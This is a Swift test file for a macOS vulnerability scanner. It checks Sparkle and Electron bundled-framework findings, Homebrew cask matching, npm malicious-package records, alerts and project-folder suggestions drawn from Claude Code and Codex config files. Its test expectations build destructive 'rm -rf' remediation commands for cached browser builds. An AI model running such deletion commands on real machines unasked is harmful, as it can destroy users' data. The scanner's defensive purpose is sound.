          <item><title>Phased</title><pubDate>Tue, 20 Oct 2026 00:00:00 GMT</pubDate><sparkle:version>22400</sparkle:version><sparkle:phasedRolloutInterval>172800</sparkle:phasedRolloutInterval>
            <enclosure url="https://example.com/p.zip"/></item>
          <item><title>Current</title><pubDate>Tue, 27 Oct 2026 15:50:31 +0000</pubDate><sparkle:version>22391</sparkle:version><enclosure url="https://example.com/c.zip"/></item>
        </channel></rss>
        """.utf8)
        let dated = SparkleFeeds.releases(datedFeed)
        let october28 = Date(timeIntervalSince1970: 1_793_150_000)  // Oct 28, 2026, about an hour after the newest release
        expect(dated.count == 3 && dated[0].date == Date(timeIntervalSince1970: 1_793_147_230) && dated[0].hardware == ["arm64"] && dated[1].rollout == 172_800
               && dated[1].date == Date(timeIntervalSince1970: 1_792_454_400), "feed items keep their date, phased rollout interval and processor requirement; the channel's date is ignored")
        let codexInstalled = Installation(product: "codex-app", name: "Codex", version: "26.1023.50603", path: "/Applications/ChatGPT.app", domain: "apps", manager: "app", build: "22391")
        expect(SparkleFeeds.fresh(codexInstalled, releases: [dated[0], dated[2]], system: "Version 27.0", machine: "arm64", now: october28)?.build == "22530",
               "a release from an hour ago is too recent to count")
        expect(SparkleFeeds.fresh(codexInstalled, releases: [dated[0], dated[2]], system: "Version 27.0", machine: "arm64", now: october28.addingTimeInterval(8 * 86_400)) == nil,
               "after a week it counts")
        expect(SparkleFeeds.fresh(codexInstalled, releases: dated, system: "Version 27.0", machine: "arm64", now: october28)?.build == "22530"
               && SparkleFeeds.fresh(codexInstalled, releases: dated, system: "Version 27.0", machine: "arm64", now: october28.addingTimeInterval(7 * 86_400)) == nil,
               "a phased rollout two days apart takes fourteen days to reach every copy; then it counts")
        let olderCodex = Installation(product: "codex-app", name: "Codex", version: "26.1021.31345", path: "/Applications/ChatGPT.app", domain: "apps", manager: "app", build: "21828")
        expect(SparkleFeeds.fresh(olderCodex, releases: [dated[0], dated[2], SparkleFeeds.Release(build: "22000", version: "26.1022", minimumSystem: nil, date: Date(timeIntervalSince1970: 1_792_000_000))],
                                  system: "Version 27.0", machine: "arm64", now: october28) == nil, "an older newer release that has been out for weeks makes the update count")
        expect(SparkleFeeds.newest([dated[0], dated[2]], system: "Version 27.0", machine: "x86_64")?.build == "22391"
               && SparkleFeeds.current(codexInstalled, releases: [dated[0], dated[2]], system: "Version 27.0") == (SparkleFeeds.machine != "arm64"),
               "a release for Apple silicon only isn't newer on an Intel Mac")
        let codexSparkle = Finding(source: "osv", installation: Installation(product: "swifturl:github.com/sparkle-project/Sparkle", name: "Sparkle in Codex", version: "2.9.1",
                                   path: "/Applications/ChatGPT.app/Contents/Frameworks/Sparkle.framework", domain: "apps", ecosystem: "SwiftURL", packageName: "github.com/sparkle-project/Sparkle",
                                   manager: "sparkle-framework", location: "/Applications/ChatGPT.app"), kind: .security, fixed: "2.9.2", reason: "", action: "", links: [])
        let codexUpdate = Finding(source: "sparkle-feed", installation: codexInstalled, kind: .update, fixed: "26.1023.51421", reason: "", action: "", links: [])
        var freshCodex = [codexSparkle, codexUpdate], settledCodex = [codexSparkle, codexUpdate]
        Scanner.markBundledAwaiting(&freshCodex, currentApps: [], fresh: ["/Applications/ChatGPT.app": dated[0]])
        Scanner.markBundledAwaiting(&settledCodex, currentApps: [])
        expect(freshCodex[0].awaitingFix == true && freshCodex[0].fixed == "2.9.2, not in Codex yet" && freshCodex[0].action.hasPrefix("Codex 26.1023.51421 came out on Oct 2")
               && freshCodex[1].kind == .update && ScanReport(findings: freshCodex).attention.isEmpty,
               "a bundled Sparkle waits while the app's newer release is too recent, and the app's update stays listed")
        expect(settledCodex[0].awaitingFix == nil && ScanReport(findings: settledCodex).attention.count == 1, "once the newer release counts, the bundled Sparkle needs attention")

        // Alerts: a Sparkle that stops waiting means a new app release, which may or may not bundle a newer Sparkle.
        let folxAlert = Alerts.findings([folxReleased[0]], released: [waitingSparkle.id])
        expect(folxAlert.title == "New Folx release" && folxAlert.body == "The new release of Folx may include a newer Sparkle than the vulnerable version it bundles now. Open Shipshape for details.",
               "a Sparkle alert names the app and doesn't call it a fix")
        let twoApps = Alerts.findings([itermSparkle, folxReleased[0]], released: [waitingSparkle.id, itermSparkle.id])
        expect(twoApps.title == "New app releases" && twoApps.body == "New releases of Folx and iTerm2 may include a newer Sparkle than the vulnerable versions they bundle now. Open Shipshape for details.",
               "several apps with new releases are named together")
        let firstSeen = Alerts.findings([freshSparkle[0]], released: [])
        expect(firstSeen.title == "Security updates to review" && firstSeen.body == "Sparkle in Folx. Open Shipshape for versions and update commands.", "a new Sparkle finding is named by its app, not Sparkle's repository")
        let leftPad = Finding(source: "osv", installation: Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/p/package-lock.json#left-pad", domain: "projects", packageName: "left-pad"),
                              kind: .security, fixed: "1.1.0", reason: "", action: "", links: [])
        let mixed = Alerts.findings([leftPad, folxReleased[0]], released: [waitingSparkle.id])
        expect(mixed.title == "Security updates to review"
               && mixed.body == "left-pad. The new release of Folx may include a newer Sparkle than the vulnerable version it bundles now. Open Shipshape for versions and update commands.", "other findings are listed before the app release")
        expect(Alerts.findings([leftPad, folxReleased[0]], released: [waitingSparkle.id, leftPad.id]).title == "Fix now available", "a real fix that was waiting keeps its title")
        var badPad = leftPad; badPad.malicious = true
        expect(Alerts.findings([badPad, folxReleased[0]], released: [waitingSparkle.id]).title == "Malicious package found", "malicious packages come first")
        expect(Alerts.list(["A"]) == "A" && Alerts.list(["A", "B"]) == "A and B" && Alerts.list(["A", "B", "C"]) == "A, B and C"
               && Alerts.list(["A", "B", "C", "D", "E", "F"]) == "A, B, C, D and 2 more", "app names are listed in a sentence")

        // Electron: an app built on it is kept with the Electron it bundles. Electron's release list gives each release's
        // Chromium and the majors that still get fixes, and NVD's Chrome vulnerabilities count against a release only when
        // NVD published them more than a week after it came out.
        let electronRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-electron-\(UUID().uuidString)").path
        let electronResources = electronRoot + "/Chat.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Resources"
        try FileManager.default.createDirectory(atPath: electronResources, withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: ["CFBundleIdentifier": "com.example.chat", "CFBundleShortVersionString": "0.0.380"], format: .xml, options: 0)
            .write(to: URL(fileURLWithPath: electronRoot + "/Chat.app/Contents/Info.plist"))
        try PropertyListSerialization.data(fromPropertyList: ["CFBundleIdentifier": "com.github.Electron.framework", "CFBundleVersion": "37.6.0"], format: .xml, options: 0)
            .write(to: URL(fileURLWithPath: electronResources + "/Info.plist"))
        let electronApps = Inventory.apps(roots: [electronRoot]).0
        try? FileManager.default.removeItem(atPath: electronRoot)
        expect(electronApps.map { "\($0.name) \($0.version) \($0.manager!) \($0.ecosystem ?? "-") \($0.packageName ?? "-")" } == ["Chat 0.0.380 app - -", "Electron in Chat 37.6.0 electron-framework npm electron"]
               && electronApps.last?.location?.hasSuffix("/Chat.app") == true && electronApps.last?.bundledApp == "Chat" && electronApps.last?.bundledFramework == "Electron",
               "an app outside the catalog is kept when it's built on Electron, and its Electron is checked with OSV as npm's electron")
        func electronRow(_ version: String, _ date: String, _ chrome: String) -> [String: Any] { ["version": version, "date": String(date.prefix(10)), "fullDate": date, "chrome": chrome] }
        let electronReleases = Electron.parse([
            electronRow("47.0.0-nightly.20261102", "2026-11-02T14:00:29.000Z", "159.0.8130.0"), electronRow("45.2.2", "2026-11-03T10:00:00.000Z", "156.0.8078.80"),
            electronRow("45.0.0", "2026-10-21T10:00:00.000Z", "156.0.8078.20"), electronRow("44.10.2", "2026-11-03T10:00:00.000Z", "152.0.7977.169"),
            electronRow("44.9.3", "2026-10-21T10:00:00.000Z", "152.0.7977.167"), electronRow("44.0.0", "2026-08-24T10:00:00.000Z", "152.0.7977.10"),
            electronRow("43.8.7", "2026-11-03T10:00:00.000Z", "150.0.7871.250"), electronRow("43.0.0", "2026-06-30T10:00:00.000Z", "150.0.7871.10"),
            electronRow("42.0.0", "2026-05-05T10:00:00.000Z", "148.0.7778.10"), electronRow("40.0.0", "2026-01-13T10:00:00.000Z", "144.0.7559.10"),
            electronRow("37.6.0", "2025-09-27T10:00:00.000Z", "138.0.7204.251"), electronRow("37.0.0", "2025-06-24T10:00:00.000Z", "138.0.7204.35"),
            ["version": "36.0.0", "date": "2025-04-29"]])
        expect(electronReleases.supported == [45, 44, 43] && electronReleases.newest[44]?.version == "44.10.2" && electronReleases.all["37.6.0"]?.chromium == "138.0.7204.251"
               && electronReleases.all["47.0.0-nightly.20261102"] == nil && electronReleases.all["36.0.0"] == nil
               && electronReleases.ended(37) == electronReleases.started[40] && electronReleases.ended(42) == electronReleases.started[45] && electronReleases.ended(44) == nil,
               "the three newest majors are supported; a major's support ends when the one three above it comes out; nightlies and rows without a Chromium are skipped")
        let chat37 = electronApps.last!, released37 = electronReleases.all["37.6.0"]!.date
        func electronItem(_ version: String) -> Installation {
            Installation(product: "electron", name: chat37.name, version: version, path: chat37.path, domain: "apps", ecosystem: "npm", packageName: "electron", manager: "electron-framework", location: chat37.location)
        }
        let chromeHits = [NVDHit(id: "CVE-2025-1", fixed: "139.0.7258.5", severity: "HIGH", published: released37.addingTimeInterval(3 * 86_400)),
                          NVDHit(id: "CVE-2026-2", fixed: "156.0.8078.73", severity: "CRITICAL", published: released37.addingTimeInterval(40 * 86_400)),
                          NVDHit(id: "CVE-2026-3", fixed: "150.0.7871.20", severity: "MEDIUM", published: released37.addingTimeInterval(90 * 86_400))]
        let chatOld = Electron.finding(chat37, releases: electronReleases, hits: chromeHits)!
        expect(chatOld.kind == .security && chatOld.source == "nvd:electron" && chatOld.advisories == ["CVE-2026-2", "CVE-2026-3"] && chatOld.severity == "CRITICAL" && chatOld.fixed == "43.8.7"
               && chatOld.reason == "Chat is built on Electron 37.6.0, released Sep 27, 2025, with Chromium 138.0.7204.251. NVD published 2 Chrome vulnerabilities affecting that Chromium more than a week after this release came out, so it doesn't have their fixes. Electron 37 stopped getting security fixes on Jan 13, 2026, when Electron 40 came out, so this Chromium gets no more of them until Chat moves to a newer Electron."
               && chatOld.action.hasPrefix("Update Chat to a release that bundles Electron 43.8.7 or later")
               && Commands.commands(for: chatOld).first.map { $0.kind == "app" && $0.text == "Open Chat" && $0.note.contains("bundles Electron 43.8.7 or later") } == true,
               "an Electron that stopped getting fixes counts the Chrome vulnerabilities published over a week after its release, and points at the oldest supported major's newest release")
        let released44 = electronReleases.all["44.9.3"]!.date
        let laterHit = NVDHit(id: "CVE-2026-4", fixed: "156.0.8078.73", severity: "HIGH", published: released44.addingTimeInterval(8 * 86_400))
        let behind = Electron.finding(electronItem("44.9.3"), releases: electronReleases, hits: [laterHit] + chromeHits)!
        expect(behind.advisories == ["CVE-2026-4"] && behind.fixed == "44.10.2" && behind.reason.hasSuffix("Electron 44 still gets Chrome's fixes; its newest release is 44.10.2."),
               "a supported Electron counts only what came out after it and points at its own major's newest release")
        let unreleased = Electron.finding(electronItem("44.10.2"), releases: electronReleases,
                                          hits: [NVDHit(id: "CVE-2026-5", fixed: nil, severity: "HIGH", published: electronReleases.all["44.10.2"]!.date.addingTimeInterval(10 * 86_400))])!
        expect(unreleased.fixed == NVD.noFixListed && unreleased.action.hasPrefix("No Electron 44 release has these fixes yet") && unreleased.reason.hasSuffix("but no Electron 44 release has these yet."),
               "the newest release of a supported major with newer vulnerabilities has no fix to point at")
        let quietChat = Electron.finding(chat37, releases: electronReleases, hits: [])
        expect(Electron.finding(electronItem("44.9.3"), releases: electronReleases, hits: chromeHits) == nil && Electron.finding(electronItem("44.9.4"), releases: electronReleases, hits: [laterHit]) == nil
               && quietChat?.kind == .unsupported && quietChat?.advisories == [] && quietChat?.fixed == "43.8.7",
               "a supported Electron with nothing newer has no finding, an unknown release can't be checked, and one that stopped getting fixes is flagged anyway")
        let electronTarget = "npm|electron"
        let electronVulns = ["GHSA-e1": OSV.Vuln(id: "GHSA-e1", summary: "Electron: SameSite cookie restrictions are not applied to windows opened from links", aliases: ["CVE-2026-9001"], severity: "HIGH", fixed: [electronTarget: ["42.11.16", "43.8.5"]]),
                             "GHSA-e2": OSV.Vuln(id: "GHSA-e2", summary: "Electron: Out-of-bounds read in second-instance IPC", aliases: [], severity: "MODERATE", fixed: [electronTarget: ["38.1.0"]])]
        let chatOwn = OSV.findings(for: [chat37], matches: [OSV.key(chat37)!: ["GHSA-e1", "GHSA-e2"]], vulns: electronVulns)
        var combined = chatOwn + [chatOld], combinedQuiet = chatOwn + [quietChat!], ownOnly = chatOwn
        Electron.combine(&combined); Electron.combine(&combinedQuiet); Electron.combine(&ownOnly)
        expect(chatOwn.count == 1 && combined.count == 1 && combined[0].source == "nvd:electron" && combined[0].fixed == "43.8.7"
               && combined[0].advisories == ["CVE-2026-2", "CVE-2026-3", "CVE-2026-9001", "GHSA-e1", "GHSA-e2"]
               && combined[0].reason.hasSuffix("Electron has also published 2 advisories that affect this release: SameSite cookie restrictions are not applied to windows opened from links; Out-of-bounds read in second-instance IPC.")
               && combinedQuiet.count == 1 && combinedQuiet[0].kind == .security && combinedQuiet[0].severity == "HIGH" && ownOnly.count == 1 && ownOnly[0].source == "osv",
               "Electron's own advisories join the app's Electron card and its supported target, and stand alone without one")
        var chatWaiting = [chatOld], chatCurrent = [chatOld]
        Scanner.markBundledAwaiting(&chatWaiting, currentApps: [])
        Scanner.markBundledAwaiting(&chatCurrent, currentApps: [chat37.location!])
        expect(chatWaiting[0].awaitingFix == true && chatWaiting[0].fixed == "43.8.7, not in Chat yet" && Commands.commands(for: chatWaiting[0]).isEmpty
               && chatWaiting[0].action == "Shipshape can't see whether a newer Chat is out, so check for updates in Chat. If you have the newest, only its developer can move it to a newer Electron, so let them know."
               && chatCurrent[0].action.hasPrefix("You have the newest Chat, and it still bundles Electron 37.6.0. Only its developer can update Electron"),
               "an app's Electron waits for the app's next release, saying whether Shipshape can see that the app is current")
        var exploitedChat = chatWaiting[0]; exploitedChat.exploited = true
        expect(ScanReport(findings: chatWaiting).attention.isEmpty && ScanReport(findings: [exploitedChat]).attention.count == 1,
               "a waiting Electron needs attention only when its Chromium has a known exploited vulnerability")
        let chatUpdate = Finding(source: "homebrew-cask", installation: Installation(product: "app:com.example.chat", name: "Chat", version: "0.0.380", path: chat37.location!, domain: "apps", manager: "app"),
                                 kind: .update, fixed: "0.0.381", reason: "", action: "", links: [])
        var chatReleased = [chatOld, chatUpdate]
        Scanner.markBundledAwaiting(&chatReleased, currentApps: [])
        expect(chatReleased[0].awaitingFix == nil
               && Alerts.findings([chatReleased[0]], released: [chatOld.id]).body == "The new release of Chat may include a newer Electron than the vulnerable version it bundles now. Open Shipshape for details."
               && Alerts.findings([chatReleased[0], folxReleased[0]], released: [chatOld.id, waitingSparkle.id]).body.hasPrefix("New releases of Chat and Folx may include a newer Sparkle or Electron than"),
               "a newer release of the app ends the wait, and its alert says it may bring a newer Electron")

        // Alerts for findings waiting for a fix: none until exploited, then once per installed version, however many
        // advisories NVD adds; a fix that comes out later alerts as usual.
        var quietWait = chatWaiting[0]; quietWait.exploited = false
        let exploitedWait = exploitedChat
        var delivered: [String: String] = [:]
        expect(Alerts.due(ScanReport(findings: [quietWait]), delivered: [:]).isEmpty && Alerts.due(ScanReport(findings: [exploitedWait]), delivered: [:]).count == 1,
               "a waiting finding alerts only once it's exploited")
        for finding in Alerts.due(ScanReport(findings: [exploitedWait]), delivered: delivered) { delivered[finding.id] = Alerts.signature(finding) }
        var moreAdvisories = exploitedWait; moreAdvisories.advisories.append("CVE-2026-99999")
        let upgradedChat = Finding(source: exploitedWait.source, installation: electronItem("37.7.0"), kind: .security, fixed: exploitedWait.fixed, reason: "", action: "", links: [],
                                   advisories: exploitedWait.advisories, exploited: true, awaitingFix: true)
        var fixedNow = exploitedWait; fixedNow.awaitingFix = nil; fixedNow.fixed = "43.8.7"
        expect(Alerts.due(ScanReport(findings: [moreAdvisories]), delivered: delivered).isEmpty && Alerts.due(ScanReport(findings: [upgradedChat]), delivered: delivered).count == 1
               && Alerts.due(ScanReport(findings: [fixedNow]), delivered: delivered).count == 1,
               "new advisories on an exploited waiting finding don't alert again; another installed version or a fix does")
        expect(Alerts.pruned(delivered, report: ScanReport(findings: [moreAdvisories])) == delivered && Alerts.pruned(delivered, report: ScanReport(findings: [quietWait])).isEmpty,
               "an exploited waiting finding keeps its alert record between checks; a quiet one doesn't")
        let exploitedAlert = Alerts.findings([exploitedWait], released: [])
        expect(exploitedAlert.title == "Known exploitation, no fix yet"
               && exploitedAlert.body == "Electron in Chat has a flaw attackers are using, and nothing you can install fixes it yet. Open Shipshape for details."
               && Alerts.findings([exploitedWait, leftPad], released: []).title == "Security updates to review",
               "the alert says attackers are using it and nothing can be installed yet")

        // Apps Homebrew didn't install are matched to a cask by app name, so their newest release is known.
        let caskJSON = Data("""
        [{"token": "discord", "version": "0.0.421", "auto_updates": true, "homepage": "https://discord.com/", "artifacts": [{"uninstall": [{"quit": "com.hnc.Discord"}]}, {"app": ["Discord.app"]}, {"zap": [{"trash": ["~/x"]}]}]},
         {"token": "orca", "version": "1.3.1", "artifacts": [{"app": ["Orca.app", {"target": "Other.app"}]}]},
         {"token": "firefox", "version": "140.0", "artifacts": [{"app": ["Firefox.app"]}]}, {"token": "firefox@esr", "version": "128.0", "artifacts": [{"app": ["Firefox.app"]}]},
         {"token": "nightly-tool", "version": "latest", "artifacts": [{"app": ["Nightly.app"]}]}, {"token": "no-app", "version": "1.0", "artifacts": [{"pkg": ["x.pkg"]}]}]
        """.utf8)
        let caskData = try HomebrewMetadata.parse(caskJSON, kind: "cask")
        func caskless(_ name: String, _ version: String) -> Installation { Installation(product: "app:com.example." + name.lowercased(), name: name, version: version, path: "/Applications/\(name).app", domain: "apps", manager: "app") }
        let caskMatches = caskData.matched([caskless("Discord", "0.0.382"), caskless("Orca", "1.4.245"), caskless("Firefox", "139.0"), caskless("Nightly", "1.0"), caskless("Unknown", "1.0")])
        expect(caskData.apps["Discord.app"] == ["discord"] && caskData.apps["Orca.app"] == ["orca"] && caskData.apps["Other.app"] == nil && caskData.latest["discord"] == "0.0.421"
               && caskData.casks["discord"]?.autoUpdates == true && caskMatches.map { "\($0.name) \($0.package ?? "-")" } == ["Discord discord"],
               "an app matches the one cask that installs an app of its name; a cask older than the app, a name two casks share and an unversioned cask don't")

        // npm's empty placeholders (0.0.1-security) are listed to remove, not as malware.
        func lockedNPM(_ name: String, _ version: String) -> Installation {
            Installation(product: "npm:" + name, name: name, version: version, path: "/p/package-lock.json#" + name + "@" + version, domain: "projects", ecosystem: "npm", packageName: name, manager: "npm", location: "/p", dependency: "dev")
        }
        let fsPlaceholder = lockedNPM("fs", "0.0.1-security"), fsReal = lockedNPM("fs", "0.0.2")
        let malFS = ["MAL-2025-21003": OSV.Vuln(id: "MAL-2025-21003", summary: "Malicious code in fs (npm)", aliases: [], severity: "CRITICAL", fixed: [:])]
        let placeholderFindings = OSV.findings(for: [fsPlaceholder, fsReal], matches: [OSV.key(fsPlaceholder)!: ["MAL-2025-21003"], OSV.key(fsReal)!: ["MAL-2025-21003"]], vulns: malFS)
        expect(placeholderFindings.count == 2 && placeholderFindings[0].kind == .update && placeholderFindings[0].malicious == nil && placeholderFindings[0].fixed == OSV.placeholderFix
               && placeholderFindings[0].reason.hasPrefix("This is npm's empty placeholder for fs, 0.0.1-security") && Commands.commands(for: placeholderFindings[0]).first?.text.hasSuffix("npm uninstall fs") == true
               && placeholderFindings[1].malicious == true && ScanReport(findings: [placeholderFindings[0]]).attention.isEmpty,
               "npm's placeholder is an update to remove it, with the uninstall command; other versions of the name are still malware")

        // Hiding until something changes: out of the counts and alerts, back when the version, fix, exploitation or malware changes.
        var hideReport = ScanReport(findings: [chatOld, leftPad])
        let hiddenNow = Hiding.apply([chatOld.id: Hiding.signature(chatOld)], to: &hideReport)
        expect(hiddenNow.count == 1 && hideReport.findings[0].hidden == true && hideReport.attention.map(\.id) == [leftPad.id] && FindingCategory.counts(in: hideReport)[.security] == 1
               && Alerts.due(hideReport, delivered: [:]).map(\.id) == [leftPad.id] && hideReport.findings.count == 2,
               "a hidden finding stays in the report but leaves attention, the counts and alerts")
        expect(FindingCategory.hiddenCounts(in: hideReport) == [FindingCategory(of: chatOld): 1] && FindingCategory.hiddenCounts(in: ScanReport(findings: [chatOld, leftPad])).isEmpty,
               "each tile says how many of its findings are hidden")
        var moreCVEs = chatOld; moreCVEs.advisories.append("CVE-2026-55555"); moreCVEs.severity = "LOW"
        var nowExploited = chatOld; nowExploited.exploited = true
        var nowWaiting = chatOld; nowWaiting.awaitingFix = true
        func stillHidden(_ finding: Finding) -> Bool { var report = ScanReport(findings: [finding]); return !Hiding.apply(hiddenNow, to: &report).isEmpty && report.findings[0].hidden == true }
        expect(stillHidden(moreCVEs) && !stillHidden(nowExploited) && !stillHidden(nowWaiting) && !stillHidden(Finding(source: chatOld.source, installation: electronItem("44.9.3"), kind: .security, fixed: "44.10.2", reason: "", action: "", links: [])),
               "new advisories keep it hidden; exploitation, a change in whether a fix can be installed, or another version brings it back")
        var withoutChat = ScanReport(findings: [leftPad])
        expect(Hiding.apply(hiddenNow, to: &withoutChat).isEmpty, "a hiding is forgotten once its finding is gone")

        // Project folders suggested from Claude Code and Codex: projects with lockfiles, grouped by folder, never the home folder or above it.
        let suggestHome = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-suggest-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: suggestHome + "/.codex", withIntermediateDirectories: true)
        try Data(#"{"projects": {"/Users/me/Code/shop": {}, "/Users/me/Code/api": {}}, "mcpServers": {}}"#.utf8).write(to: URL(fileURLWithPath: suggestHome + "/.claude.json"))
        try Data("model = \"x\"\n[projects.\"/Users/me\"]\ntrust_level = \"trusted\"\n[projects.\"/Users/me/Desktop/demo\"]\n[projects.\"/Volumes/Work/site\"]\n".utf8).write(to: URL(fileURLWithPath: suggestHome + "/.codex/config.toml"))
        let knownProjects = ProjectSuggestions.known(home: suggestHome)
        try? FileManager.default.removeItem(atPath: suggestHome)
        expect(Set(knownProjects) == ["/Users/me/Code/shop", "/Users/me/Code/api", "/Users/me", "/Users/me/Desktop/demo", "/Volumes/Work/site"], "Claude Code's and Codex's project paths are read, and nothing else")
        let withLockfiles: Set<String> = ["/Users/me/Code/shop", "/Users/me/Code/api", "/Users/me/Desktop/demo", "/Users/me", "/Users/me/.claude/worktrees/x", "/Volumes/Work/site"]
        let suggested = ProjectSuggestions.suggest(knownProjects + ["/Users/me/.claude/worktrees/x", "/Users/me/Code/notes"], existing: [], home: "/Users/me", isProject: withLockfiles.contains)
        expect(suggested.map { "\($0.path) \($0.projects)" } == ["/Users/me/Code 2", "/Users/me/Desktop/demo 1", "/Volumes/Work/site 1"]
               && ProjectSuggestions.suggest(knownProjects, existing: ["/Users/me/Code"], home: "/Users/me", isProject: withLockfiles.contains).map(\.path) == ["/Users/me/Desktop/demo", "/Volumes/Work/site"],
               "two projects in one folder suggest the folder; one alone suggests itself; the home folder, hidden folders, projects without lockfiles and covered ones are left out")

        // Browser builds test tools download, and Apple's Python.
        let toolHome = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-testtools-\(UUID().uuidString)").path
        for folder in [".cache/puppeteer/chrome/mac_arm-131.0.6778.204", ".cache/puppeteer/chrome-headless-shell/mac_arm-131.0.6778.204", ".cache/puppeteer/firefox/mac-stable_133.0.3",
                       ".cache/puppeteer/chromedriver/mac_arm-131.0.6778.204", ".cache/selenium/chrome/mac-arm64/130.0.6723.91", ".cache/selenium/chromedriver/mac-arm64/130.0.6723.91",
                       "Library/Caches/Cypress/13.6.0/Cypress.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Resources"] {
            try FileManager.default.createDirectory(atPath: toolHome + "/" + folder, withIntermediateDirectories: true)
        }
        try PropertyListSerialization.data(fromPropertyList: ["CFBundleVersion": "37.6.0"], format: .xml, options: 0)
            .write(to: URL(fileURLWithPath: toolHome + "/Library/Caches/Cypress/13.6.0/Cypress.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Resources/Info.plist"))
        let developerTools = toolHome + "/CommandLineTools", pythonResources = developerTools + "/Library/Frameworks/Python3.framework/Versions/3.9/Resources"
        try FileManager.default.createDirectory(atPath: pythonResources, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: developerTools + "/Library/Frameworks/Python3.framework/Versions/Current", withDestinationPath: "3.9")
        try PropertyListSerialization.data(fromPropertyList: ["CFBundleShortVersionString": "3.9.6"], format: .xml, options: 0).write(to: URL(fileURLWithPath: pythonResources + "/Info.plist"))
        let toolBuilds = Inventory.testToolBrowsers(home: toolHome), applePython = Inventory.applePythons(developerFolders: [developerTools])
        try? FileManager.default.removeItem(atPath: toolHome)
        expect(toolBuilds.map { "\($0.name) \($0.version) \($0.product) \($0.manager!)" }
               == ["Chrome for Testing (Puppeteer) 131.0.6778.204 puppeteer-chrome puppeteer-cache", "Chrome headless shell (Puppeteer) 131.0.6778.204 puppeteer-chrome puppeteer-cache",
                   "Firefox (Puppeteer) 133.0.3 puppeteer-firefox puppeteer-cache", "Chrome for Testing (Selenium) 130.0.6723.91 selenium-chrome selenium-cache", "Cypress 13.6.0 37.6.0 electron cypress-cache"],
               "Puppeteer's and Selenium's Chrome and Firefox builds are read by version, drivers are skipped, and a cached Cypress app is read by its Electron")
        let puppeteerBuild = Finding(source: "nvd:puppeteer-chrome", installation: toolBuilds[0], kind: .security, fixed: "156.0.8078.73", reason: "", action: "", links: [])
        let cypressApp = toolBuilds[4], cypressFinding = Electron.finding(cypressApp, releases: electronReleases, hits: chromeHits)
        expect(Commands.commands(for: puppeteerBuild).first?.text == "rm -rf " + Shell.quote(toolBuilds[0].path) && Commands.commands(for: cypressFinding!).first?.text == "rm -rf " + Shell.quote(cypressApp.location!)
               && cypressFinding?.fixed == "Newer Cypress" && cypressFinding?.reason.hasPrefix("Cypress 13.6.0 is built on Electron 37.6.0") == true && cypressFinding?.action.hasPrefix("Update Cypress in the projects that use it") == true,
               "a cached build is deleted with rm -rf; a Cypress app's card says to update Cypress")
        let cycle: [String: Any] = ["3.9": ["status": "end-of-life", "end_of_life": "2025-10-31"], "3.10": ["status": "end-of-life"], "3.11": ["status": "security"], "3.14": ["status": "bugfix"], "3.15": ["status": "prerelease"]]
        let appleEOL = applePython.first.flatMap { Rules.applePython($0, cycle: cycle) }
        expect(applePython.map { "\($0.name) \($0.version) \($0.path.hasSuffix("/CommandLineTools/usr/bin/python3"))" } == ["Python (Command Line Tools) 3.9.6 true"]
               && appleEOL?.kind == .unsupported && appleEOL?.awaitingFix == true && appleEOL?.fixed == "Python 3.11 or later, not from Apple yet"
               && appleEOL?.reason.hasPrefix("Python 3.9 stopped getting security fixes on Oct 31, 2025.") == true && ScanReport(findings: [appleEOL!]).attention.isEmpty
               && Rules.applePython(Installation(product: "apple-python", name: "Python (Xcode)", version: "3.14.1", path: "/x", domain: "tools"), cycle: cycle) == nil,
               "Apple's Python past its end of support waits on Apple, naming the oldest supported branch; a supported one has no finding")

        // What an app's newest release bundles. electron-builder's feeds: GitHub releases or a plain URL, with the zip for this processor.
        let githubFeed = ElectronUpdater.feed("owner: stablyai\nrepo: orca\nprovider: github\nupdaterCacheDirName: orca-updater\n")
        let genericFeed = ElectronUpdater.feed("provider: generic\nurl: 'https://updates.signal.org/desktop'\n")
        let latestMac = "version: 8.34.0\nfiles:\n  - url: signal-desktop-mac-x64-8.34.0.zip\n    size: 1\n  - url: signal-desktop-mac-arm64-8.34.0.zip\n  - url: signal-desktop-mac-universal-8.34.0.dmg\nreleaseDate: '2026-11-05T15:45:48.123Z'\n"
        let orcaMac = "version: 1.4.253\nfiles:\n  - url: Orca-1.4.253-mac.zip\n  - url: Orca-1.4.253-arm64-mac.zip\n  - url: orca-macos-arm64.dmg\n"
        expect(githubFeed?.feed == "https://github.com/stablyai/orca/releases/latest/download/latest-mac.yml" && genericFeed?.feed == "https://updates.signal.org/desktop/latest-mac.yml"
               && ElectronUpdater.feed("provider: generic\nurl: http://example.com/x\n") == nil
               && ElectronUpdater.release(latestMac, base: genericFeed!.base, machine: "arm64") == ElectronUpdater.Release(version: "8.34.0", date: ISO8601DateFormatter().date(from: "2026-11-05T15:45:48Z"), download: "https://updates.signal.org/desktop/signal-desktop-mac-arm64-8.34.0.zip")
               && ElectronUpdater.release(orcaMac, base: githubFeed!.base, machine: "x86_64")?.download == "https://github.com/stablyai/orca/releases/latest/download/Orca-1.4.253-mac.zip",
               "electron-builder feeds name the newest release, its date and the zip for this Mac's processor")
        // Which of a card's fixes a release has: Electron by the finding's own date rule; Sparkle by the fixed version.
        expect(Electron.fixes(chatOld, in: "45.2.2", releases: electronReleases).map { "\($0.fixes)/\($0.total) \($0.complete)" } == "2/2 true"
               && Electron.fixes(chatOld, in: "42.0.0", releases: electronReleases).map { "\($0.fixes)/\($0.total) \($0.complete)" } == "2/2 false"
               && Electron.fixes(chatOld, in: "37.6.0", releases: electronReleases).map { "\($0.fixes)/\($0.total) \($0.complete)" } == "0/2 false"
               && Electron.fixes(chatOld, in: "45.9.9", releases: electronReleases) == nil
               && SparkleFeeds.fixes(waitingSparkle, in: "2.6.4").complete == false && SparkleFeeds.fixes(freshSparkle[0], in: "2.6.4").complete && !SparkleFeeds.fixes(freshSparkle[0], in: "2.6.3").complete,
               "a release on a supported Electron from after the advisories has every fix; one whose major ended doesn't count as complete; a Sparkle at the fixed version has it")
        // The card says what the newest release has: the fix (with its date, out of waiting), some fixes, or none (waiting, naming the release).
        let nov5 = ISO8601DateFormatter().date(from: "2026-11-05T15:45:48Z")!
